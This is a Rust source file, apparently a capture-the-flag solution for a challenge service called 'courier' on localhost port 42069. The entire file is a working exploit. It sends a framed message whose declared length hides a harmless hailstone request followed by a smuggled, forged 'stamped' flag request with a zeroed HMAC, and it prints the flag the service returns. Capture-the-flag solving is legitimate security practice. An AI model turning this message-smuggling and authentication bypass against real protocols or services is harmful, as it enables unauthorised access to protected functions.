use courier_proto::messages::ResponsePackage::FlagResponse;
use courier_proto::messages::StampRequiredPackage::FlagRequest;
use courier_proto::messages::StampedPackage;
use courier_proto::{
    messages::CourieredPackage::{self, Response, Stamped, Unstamped},
    messages::UnstampedPackage::HailstoneRequest,
    read_msg, MSG_MAGIC,
};
use std::io::{BufReader, BufWriter, Write};
use std::net::TcpStream;

fn main() {
    let courier_write = TcpStream::connect("127.0.0.1:42069").unwrap();
    let courier_read = courier_write.try_clone().unwrap();

    let mut courier_write = BufWriter::new(courier_write);
    let mut courier_read = BufReader::new(courier_read);

    let pretend = postcard::to_allocvec(&Unstamped(HailstoneRequest(1))).unwrap();
    let smuggled = postcard::to_allocvec(&Stamped(StampedPackage {
        ctr: 0,
        hmac: [0; 32],
        stamped_payload: postcard::to_allocvec(&FlagRequest).unwrap(),
    }))
    .unwrap();
    let serialised = MSG_MAGIC
        .iter()
        .copied()
        .chain((smuggled.len() as u16).to_be_bytes())
        .chain(smuggled);

    let message = MSG_MAGIC
        .iter()
        .copied()
        .chain(((1 << 11) as u16).to_be_bytes())
        .chain(pretend)
        .chain(serialised)
        .chain(std::iter::repeat(0).take(1 << 11))
        .collect::<Vec<_>>();

    courier_write.write_all(&message).unwrap();
    courier_write.flush().unwrap();
    let resp: CourieredPackage = read_msg::<_, _, { u16::MAX }>(&mut courier_read).unwrap();
    let Response(FlagResponse(flag)) = resp else { unreachable!() };

    println!("flag: {flag}");
}

